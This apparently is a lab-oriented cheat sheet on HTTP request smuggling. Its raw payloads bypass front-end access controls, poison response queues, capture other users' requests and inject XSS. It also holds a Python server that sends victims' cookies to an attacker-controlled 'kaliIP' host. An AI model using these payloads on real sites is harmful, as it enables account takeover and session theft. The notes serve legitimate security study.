---
layout: default
title: "HTTP Request Smuggling"
parent: "Web Application"
nav_order: 15
---

# HTTP Request Smuggling

HTTP Request Smuggling occurs when front-end and back-end servers disagree about where one HTTP request ends and the next begins, allowing attackers to smuggle malicious requests inside apparently legitimate ones.

**Root cause:** HTTP/1 provides two ways to specify request body size:
- `Content-Length` — message size in bytes
- `Transfer-Encoding: chunked` — message terminated with a chunk size of `0`

When front-end and back-end interpret these differently, smuggling becomes possible. Also occurs in HTTP/2 downgrading scenarios.

---

## Burp Repeater Setup

Before testing, always:
1. Downgrade HTTP protocol to `HTTP/1.1`
2. Change request method to `POST`
3. Disable automatic update of `Content-Length`
4. Enable display of non-printable characters (the `\n` button)
5. Optional: remove unnecessary headers between `Host` and `Content-Type`

---

## Methodology

1. Pick a target endpoint
2. Prep Repeater (above)
3. Detect the vulnerability type (CL.TE, TE.CL, TE.TE)
4. Confirm the vulnerability via differential responses
5. Exploit

---

## Vulnerability Types

### Detection Payloads

**Payload 1:**
```http
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X

```
- Response from backend → CL.CL
- Rejected by frontend → TE.CL or TE.TE
- Timeout from backend → CL.TE

**Payload 2:**
```http
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
- Response from backend → CL.CL or TE.TE
- Timeout from backend → TE.CL
- Socket Poison (backend) → CL.TE

Use both payloads together to distinguish types (e.g., TE.CL vs TE.TE).

---

### CL.TE
Frontend uses `Content-Length`, backend uses `Transfer-Encoding`.

**Basic CL.TE payload:**
```http
POST / HTTP/1.1
Host: VULNERABLE-SITE.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G

```
Send twice — the second request will trigger a `GPOST` error (unrecognized method).

**Note:** Highlight payload in Inspector to verify byte count.

---

### TE.CL
Frontend uses `Transfer-Encoding`, backend uses `Content-Length`.

**Basic TE.CL payload:**
```http
POST / HTTP/1.1
Host: VULNERABLE-SITE.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

How it works:
- Frontend reads chunked, finds `0` terminator, forwards everything
- Backend reads `Content-Length: 4`, only consumes `5c\r\n` (4 bytes) as body
- Everything after (`GPOST` block) remains in buffer
- Next request gets prepended with `GPOST`, causing an error

`5c` = hex for 92 — must equal the byte count from `GPOST` line through `x=1`. Check in Inspector (shows hex value next to decimal count). Convert decimal to hex with CyberChef.

The final request must be terminated with `0\r\n\r\n`.

---

### TE.TE
Both frontend and backend support `Transfer-Encoding`, but one can be made to ignore it via obfuscation.

**Obfuscation techniques:**
```http
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

Goal: frontend accepts the obfuscated TE, backend ignores it and falls back to Content-Length → effectively becomes TE.CL.

**TE.TE example:**
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

---

## Exploitation Techniques

### Bypass Front-End Security Controls
Smuggle a request to a restricted endpoint:
```http
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: x
```

Note: use `Foo: x` at the end without a newline to absorb extra headers appended by the front-end.

### Reveal Front-End Request Rewriting
Find what headers the front-end is adding:
1. Find a POST parameter that is reflected in the response
2. Place that parameter last in the body
3. Smuggle the request so the next request's rewritten form is appended to the reflected value
4. Look for headers like `X-Forwarded-For`, `X-SSL-CLIENT-CN`, custom IP headers

### Bypass Client Authentication
Use discovered internal headers to impersonate privileged users:
```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
Foo: x
```

### Capture Other Users' Requests
Store an overly-long comment/email that captures the next user's request:
```http
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=YOUR-SESSION-COOKIE

csrf=TOKEN&postId=2&name=Name&email=email%40example.com&website=http%3A%2F%2Fexample.com&comment=
```

The victim's request gets appended to the comment. Retrieve the saved comment to read their session cookie.

**Limitation:** Only captures data up to the first `&` delimiter in URL-encoded submissions.

### Deliver Reflected XSS
Use request smuggling to deliver XSS payloads via headers users can't normally control:
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```

**Advantage:** No victim interaction needed; XSS is triggered by the next user's request.

---

## HTTP/2 Request Smuggling

HTTP/2 uses binary frames with explicit length fields — no Content-Length ambiguity. However, **HTTP/2 downgrading** (frontend speaks HTTP/2, backend speaks HTTP/1.1) reintroduces smuggling opportunities.

HTTP/2 pseudo-headers: `:method`, `:path`, `:scheme`, `:authority`. All headers are lowercase.

### H2.CL Vulnerabilities
HTTP/2 doesn't require `Content-Length`, but including a `content-length` header that doesn't match can smuggle a second request:
```http
POST / HTTP/2
Host: TARGET
Content-Length: 0

GET /post/like/12315 HTTP/1.1
X: f
```

### H2.TE Vulnerabilities
Chunked Transfer-Encoding is incompatible with HTTP/2, but some front-end servers fail to strip it:
```http
POST / HTTP/2
Host: TARGET
Transfer-Encoding: chunked

0

SMUGGLED-REQUEST
```

### CRLF Injection (HTTP/2)
HTTP/2 binary format allows injecting CRLF characters that HTTP/1.1 interprets as header terminators:
1. In Burp Repeater → Inspector → Add new header (`foo`)
2. For the header value, press `Shift+Enter` to insert a literal newline, then type `Transfer-Encoding: chunked`
3. This injects a TE header that only the HTTP/1.1 backend sees

### Hidden HTTP/2 Support
If server doesn't advertise HTTP/2:
1. Burp Settings → Tools → Repeater → Connections
2. Enable "Allow HTTP/2 ALPN override"
3. In Repeater Inspector → Request Attributes → Protocol → HTTP/2

### Response Queue Poisoning (H2.TE)
Causes the front-end to map backend responses to the wrong requests. Requires smuggling a complete standalone request (not just a prefix) that receives its own response without closing the TCP connection.

```http
POST /x HTTP/2
Host: VULNERABLE-SITE.net
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: VULNERABLE-SITE.net

```

Use Burp Intruder with null payloads (1 max concurrent request, disable auto Content-Length update) to send repeatedly until admin user's request provides their session cookie.

### Request Splitting (CRLF)
Split a single HTTP/2 request into two HTTP/1.1 requests:
1. Inject CRLF into a header value to terminate the first request
2. Add the second request after the CRLF
3. Add `Host` header before the split so the first request has all required headers

```
Foo header value:
bar\r\n
\r\n
GET /x HTTP/1.1
Host: TARGET.net
```

### Request Tunneling
Use H2.CL/H2.TE to tunnel requests to the backend, bypassing front-end restrictions. Unlike poisoning, tunneling only affects your own connection.

To leak internal headers:
```
POST /hello HTTP/2
...
Foo: bar\r\n
Host: TARGET\r\n
\r\n
POST /hello HTTP/1.1\r\n
Content-Length: 300\r\n
Host: TARGET\r\n
Content-Type: application/x-www-form-urlencoded\r\n
\r\n
q=
```

### CL.0 Request Smuggling
Some servers ignore `Content-Length` entirely (treat it as 0) for certain endpoints (especially static file endpoints or those that don't expect POST).

```http
POST /resources/images/blog.svg HTTP/1.1
Host: TARGET
Cookie: session=YOUR-SESSION
Connection: keep-alive
Content-Length: <CORRECT>

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```

Use "Send group in sequence (single connection)" in Burp Repeater.

---

## Browser-Based Desync Attacks

Browser Desync attacks desynchronize the front-end only (not a traditional back-end desync). Uses HTTP Keep-Alive.

Three requests in the attack:
1. Initial request (with smuggled prefix in body)
2. Smuggled request (from attacker)
3. Next legitimate request (from victim)

**HTML exploit form:**
```html
<form id="btn" action="http://challenge.thm/" method="POST" enctype="text/plain">
  <textarea name="GET http://kaliIP:1337 HTTP/1.1
AAA: A">placeholder1</textarea>
  <button type="submit">placeholder2</button>
</form>
<script>btn.submit()</script>
```

**Python server to capture cookies:**
```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import ssl

class ExploitHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"fetch('http://kaliIP:8080/' + document.cookie)")

def run_server(port=1337):
    server_address = ('', port)
    httpd = HTTPServer(server_address, ExploitHandler)
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
```

---

## WebSocket Request Smuggling

The WebSocket upgrade process can be abused if a proxy assumes the upgrade succeeds regardless of the server's response.

**Attack flow:**
1. Send upgrade request with **invalid** version number
2. Proxy forwards to backend
3. Backend responds with `426 Upgrade Required` (no upgrade)
4. Proxy assumes upgrade succeeded — further requests are tunneled

```http
GET /socket HTTP/1.1
Host: TARGET:8001
Sec-WebSocket-Version: 777
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: TARGET:8001
```

Note: Two blank lines required at the end in some cases.

**Defeating Secure Proxies:** Find a SSRF-like vulnerability that allows proxying a request to an attacker-controlled server that returns a fake `101 Switching Protocols` response.

---

## h2c Smuggling

HTTP/2 over cleartext (h2c) can be requested via HTTP/1.1 upgrade headers:
- `Connection: Upgrade, HTTP2-Settings`
- `Upgrade: h2c`
- `HTTP2-Settings: <base64>`

Some reverse proxies forward these upgrade headers to the backend while maintaining the front-end connection, enabling request tunneling (not poisoning).

---

## References
- https://portswigger.net/research/http2
- https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning
